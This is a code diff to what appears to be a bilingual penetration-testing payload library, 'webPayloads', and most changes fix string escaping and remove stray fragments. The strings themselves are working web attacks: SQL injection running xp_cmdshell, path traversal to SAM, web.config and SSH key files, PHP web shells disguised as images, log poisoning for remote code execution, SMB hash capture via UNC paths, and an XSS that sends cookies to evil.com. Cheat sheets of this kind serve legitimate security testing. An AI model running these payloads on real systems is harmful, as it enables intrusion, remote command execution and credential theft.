@@ -409,7 +409,7 @@ export const webPayloads: PayloadItem[] = [
       },
       { 
         title: { zh: '3. 执行系统命令', en: '3. ExecuteSystem Commands' }, 
-        command: "'; EXEC master..xp_cmdshell 'whoami'--\n'; EXEC master..xp_cmdshell 'net user'--\n'; EXEC master..xp_cmdshell 'dir C:\'--", 
+        command: "'; EXEC master..xp_cmdshell 'whoami'--\n'; EXEC master..xp_cmdshell 'net user'--\n'; EXEC master..xp_cmdshell 'dir C:\\'--",
         description: { zh: '使用xp_cmdshell执行系统命令', en: 'Usexp_cmdshellExecuteSystem Commands' }, 
         platform: 'windows',
         syntaxBreakdown: [
@@ -10056,13 +10056,8 @@ user=admin&pass[]=1
 
 # 2. 松散比较绕过:
 POST /login HTTP/1.1
-Content-Type: application/json,
+Content-Type: application/json
 
-        syntaxBreakdown: [
-          { part: '\'', explanation: { zh: '闭合引号', en: 'Close quote' }, type: 'char' },
-          { part: 'OR', explanation: { zh: '逻辑或', en: 'Logical OR' }, type: 'keyword' },
-          { part: '--', explanation: { zh: 'SQL注释', en: 'SQL comment' }, type: 'operator' }
-        ]
 {"user":"admin","pass":true}
 # true == "any_string" 在PHP松散比较中为true
 
@@ -10649,9 +10644,9 @@ Host: target.com
       {
         title: { zh: '反斜杠与data: URI绕过', en: '反斜杠 and data: URIBypass' },
         command: `# 反斜杠技巧:
-/redirect?url=http://attacker.com\@target.com
-/redirect?url=\/\/attacker.com
-/redirect?url=\/attacker.com
+/redirect?url=http://attacker.com\\@target.com
+/redirect?url=\\/\\/attacker.com
+/redirect?url=\\/attacker.com
 
 # data: URI:
 /redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
@@ -10833,11 +10828,7 @@ done`,
 <iframe src="middle-page.html"></iframe>
 
 <!-- middle-page.html内容 -->
-<html><body>,
-          syntaxBreakdown: [
-            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
-            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' }
-          ]
+<html><body>
 <iframe src="https://target.com" sandbox="allow-forms"></iframe>
 </body></html>
 
@@ -12644,8 +12635,8 @@ curl "http://target.com/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 curl "http://target.com/download?file=..%252f..%252f..%252fetc/passwd"
 
 # Windows敏感文件:
-curl "http://target.com/download?file=..\..\..\windows\win.ini"
-curl "http://target.com/download?file=..\..\..\windows\system32\config\SAM"
+curl "http://target.com/download?file=..\\..\\..\\windows\\win.ini"
+curl "http://target.com/download?file=..\\..\\..\\windows\\system32\\config\\SAM"
 
 # Web应用配置文件:
 curl "http://target.com/download?file=../WEB-INF/web.xml"
@@ -13044,10 +13035,10 @@ curl "http://target.com/file?path=../../../../etc/passwd%00.jpg"
 curl "http://target.com/file?path=....//....//....//etc/passwd"
 
 # 反斜杠(Windows):
-curl "http://target.com/file?path=..\..\..\windows\win.ini"
+curl "http://target.com/file?path=..\\..\\..\\windows\\win.ini"
 
 # 混合斜杠:
-curl "http://target.com/file?path=..\/../..\/../etc/passwd"`,
+curl "http://target.com/file?path=..\\/../..\\/../etc/passwd"`,
         description: { zh: '使用多种编码方式绕过路径遍历的过滤机制', en: 'UseMultipleEncodingMethodBypassPathTraverse FilterMechanism' },
         platform: 'all',
         syntaxBreakdown: [
@@ -13061,16 +13052,16 @@ curl "http://target.com/file?path=..\/../..\/../etc/passwd"`,
       {
         title: { zh: 'Windows特有路径遍历', en: 'Windows特 has PathTraverse' },
         command: `# UNC路径(可能触发SMB认证):
-curl "http://target.com/file?path=\\attacker.com\share\test"
+curl "http://target.com/file?path=\\\\attacker.com\\share\\test"
 
 # Windows敏感文件:
-curl "http://target.com/file?path=C:\Windows\win.ini"
-curl "http://target.com/file?path=C:\Windows\System32\config\SAM"
-curl "http://target.com/file?path=C:\inetpub\wwwroot\web.config"
-curl "http://target.com/file?path=C:\Users\Administrator\.ssh\id_rsa"
+curl "http://target.com/file?path=C:\\Windows\\win.ini"
+curl "http://target.com/file?path=C:\\Windows\\System32\\config\\SAM"
+curl "http://target.com/file?path=C:\\inetpub\\wwwroot\\web.config"
+curl "http://target.com/file?path=C:\\Users\\Administrator\\.ssh\\id_rsa"
 
 # IIS短文件名枚举:
-curl -v "http://target.com/file?path=C:\inetpub\wwwroot\WEB~1.CON"`,
+curl -v "http://target.com/file?path=C:\\inetpub\\wwwroot\\WEB~1.CON"`,
         description: { zh: 'Windows环境下的特有路径遍历手法和敏感文件', en: 'Windows-specific path traversal techniques and sensitive files' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -13082,11 +13073,11 @@ curl -v "http://target.com/file?path=C:\inetpub\wwwroot\WEB~1.CON"`,
       {
         title: { zh: 'LFI到RCE升级', en: 'LFI to RCEUpgrade' },
         command: `# 1. 日志文件包含(Log Poisoning):
-curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"
+curl "http://target.com/" -A "<?php system($_GET['cmd']); ?>"
 curl "http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id"
 
 # 2. /proc/self/environ包含:
-curl "http://target.com/file?path=../../../proc/self/environ" -A "<?php system(\$_GET['c']); ?>"
+curl "http://target.com/file?path=../../../proc/self/environ" -A "<?php system($_GET['c']); ?>"
 
 # 3. PHP Session文件包含:
 # 先在session中写入payload(如用户名字段)
@@ -13393,7 +13384,7 @@ curl -F "file=@shell.jpg;type=application/x-php" "http://target.com/upload"
 
 # 4. 仅修改文件头(判断是否检查Magic Bytes):
 # GIF89a开头的PHP:
-printf "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.gif
+printf "GIF89a<?php system($_GET['cmd']); ?>" > shell.gif
 curl -F "file=@shell.gif;type=image/gif" "http://target.com/upload"`,
         description: { zh: '通过对比测试判断服务端使用的文件类型验证方式', en: 'Determine the server-side file type validation method through comparative testing' },
         platform: 'linux',
@@ -13431,20 +13422,20 @@ curl "http://target.com/uploads/shell.jpg/.php"`,
         command: `# 在PHP文件前添加各种文件头:
 
 # JPEG文件头:
-printf "\xff\xd8\xff\xe0\x00\x10JFIF" > shell.php
-echo "<?php system(\$_GET['cmd']); ?>" >> shell.php
+printf "\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF" > shell.php
+echo "<?php system($_GET['cmd']); ?>" >> shell.php
 
 # PNG文件头:
-printf "\x89PNG\r\n\x1a\n" > shell.php
-echo "<?php system(\$_GET['cmd']); ?>" >> shell.php
+printf "\\x89PNG\\r\\n\\x1a\\n" > shell.php
+echo "<?php system($_GET['cmd']); ?>" >> shell.php
 
 # GIF文件头:
 printf "GIF89a" > shell.php
-echo "<?php system(\$_GET['cmd']); ?>" >> shell.php
+echo "<?php system($_GET['cmd']); ?>" >> shell.php
 
 # BMP文件头:
 printf "BM" > shell.php
-echo "<?php system(\$_GET['cmd']); ?>" >> shell.php
+echo "<?php system($_GET['cmd']); ?>" >> shell.php
 
 # 上传:
 curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "http://target.com/upload"`,
@@ -13561,17 +13552,13 @@ exiftool -ICC_Profile:ProfileDescription='<?php echo "security_check"; ?>' photo
       {
         title: { zh: '空字节截断原理与环境检测', en: 'EmptybyteTruncatePrinciple and EnvironmentDetection' },
         command: `# 空字节截断受影响的环境:
-# - PHP < 5.3.4 (底层C函数将\x00视为字符串结尾),
-        syntaxBreakdown: [
-          { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
-          { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
-        ]
+# - PHP < 5.3.4 (底层C函数将\\x00视为字符串结尾)
 # - Java旧版本的File类
 # - 部分Python 2.x版本
 # - 使用C/C++扩展的程序
 
 # 检测PHP版本:
-curl -sI "http://target.com/" | grep -i "x-powered-by\|server"
+curl -sI "http://target.com/" | grep -i "x-powered-by\\|server"
 curl -s "http://target.com/phpinfo.php" | grep -i "php version"`,
         description: { zh: '检测目标环境是否可能受空字节截断影响', en: 'Detect if the target environment may be affected by null byte truncation' },
         platform: 'all',
@@ -13799,7 +13786,7 @@ curl "http://target.com/account%2fx.css"`,
         command: `# 完整攻击演示:
 
 # 1. 先确认动态页面包含敏感信息:
-curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email\|phone\|address\|token"
+curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email\\|phone\\|address\\|token"
 
 # 2. 诱导受害者访问欺骗URL(通过钓鱼邮件/消息):
 # 受害者点击: http://target.com/account/avatar.jpg
@@ -15034,7 +15021,7 @@ http://[::ffff:7f00:1]`,
       {
         title: { zh: '识别可利用的XSS和Clickjacking组合', en: 'IdentifyCanExploitation XSS and ClickjackingGroupsCombine' },
         command: `# 1. 检测iframe嵌套防护
-curl -sI "http://target.com" | grep -i "x-frame-options\|frame-ancestors"
+curl -sI "http://target.com" | grep -i "x-frame-options\\|frame-ancestors"
 
 # 2. 检测已知XSS点
 curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"
@@ -15068,7 +15055,7 @@ function nextStep() {
   } else if (step === 3) {
     // 第三步：诱导粘贴(Ctrl+V)，执行XSS
     document.getElementById("msg").innerText = "Step 3: Press Ctrl+V to paste verification code!";
-    navigator.clipboard.writeText('<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">');
+    navigator.clipboard.writeText('<img src=x onerror="fetch(\\'https://evil.com/steal?\\'+document.cookie)">');
   }
 }
 </script></head>
@@ -15138,12 +15125,7 @@ document.getElementById('frame').src = URL.createObjectURL(blob);
           title: { zh: 'sandbox属性配置错误利用', en: 'sandboxpropertyConfigurationErrorExploitation' }, 
           command: `<!-- sandbox allow-scripts允许执行JS -->
 <iframe src="https://target.com" sandbox="allow-scripts allow-same-origin">
-</iframe>,
-          syntaxBreakdown: [
-            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
-            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' },
-            { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
-          ]
+</iframe>
 
 <!-- 利用allow-popups逃逸 -->
 <iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">
